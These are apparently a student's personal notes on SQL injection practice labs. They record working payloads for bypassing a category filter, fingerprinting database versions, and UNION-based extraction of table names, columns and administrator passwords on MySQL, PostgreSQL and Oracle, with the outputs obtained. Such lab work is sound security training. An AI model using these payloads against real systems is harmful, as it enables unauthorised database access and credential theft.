Task-2 SQL Injection
Lab:1
SELECT * FROM products 	WHERE category='pets' AND released=1

SELECT * FROM products 	WHERE category=''' AND released=1

SELECT * FROM products 	WHERE category=''--' AND released=1

SELECT * FROM products 	WHERE category=''

SELECT * FROM products 	WHERE category='' or 1=1 --' AND released=1

SELECT * FROM products 	WHERE category=' + or + 1=1 --


lap:3


Lab 08 – SQL injection: querying the database type and version
on MySQL and Microsoft SQL Server

SQL Injection – Product Category

End Goal – Display the database version

Analysis:

1. Find number of columns
   ' ORDER BY 3#  → internal server error

   Therefore:
   3 - 1 = 2 columns

2. Identify columns that accept text
   ' UNION SELECT 'a', 'a'#

3. Output the version
   ' UNION SELECT @@version, NULL#

   SELECT @@version

Example result:
8.0.23



Lab9

- Determine the relevant columns
- Output the content of the table
- Login as the administrator user

Analysis:

1. Find the number of columns
' order by 3-- -> Internal server error
3 - 1 = 2

2. Find the data type of the columns
' UNION select 'a', 'a'--
-> both columns accept type text

3. Version of the database
' UNION SELECT @@version, NULL-- -> not Microsoft
' UNION SELECT version(), NULL-- -> 200 OK

My output
PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit

PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1)

4. Output the list of table names in the database

' UNION SELECT table_name, NULL FROM information_schema.tables--

my output :- users_hwjzxb

users_xacgsm

5. Output the column names of the table

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = ' users_hwjzxb'--

myoutput:- username_ikzftx ,  password_dfbfbo

username_pxqwui
password_bfvoxs

6. Output the usernames and passwords
💡
' UNION select username_ikzftx ,  password_dfbfbo from  users_hwjzxb--

myoutput:- 

administrator

ebq9l7bg75popwdkofw6

Lab #10 - SQL injection attack, listing the database
contents on Oracle

End Goals:
- Determine which table contains the usernames and
passwords
- Determine the column names in table
- Output the content of the table
- Login as the administrator user

Analysis:

1) Determine the number of columns
' order by 3-- -> internal server error

3 - 1 = 2

2) Find data type of columns
' UNION select 'a', 'a' from DUAL--
-> Oracle database
-> both columns accept type text

3) Output the list of tables in the database

' UNION SELECT table_name, NULL FROM all_tables--

my output:-USERS_YNXRGA

USERS_JYPOMG

4) Output the column names of the users table

' UNION SELECT column_name, NULL FROM all_tab_columns
WHERE table_name = 'USERS_YNXRGA'--

my output:- PASSWORD_TCKVIZ  , USERNAME_PSTCOC

USERNAME_LDANZP
PASSWORD_DYZWEQ

5) Output the list of usernames/passwords

' UNION select USERNAME_PSTCOC, PASSWORD_TCKVIZ  from USERS_YNXRGA--
my output;- administrator ,  bwursc75rnst3l882q0z

administrator
c30j8bn7ejg5oisvbije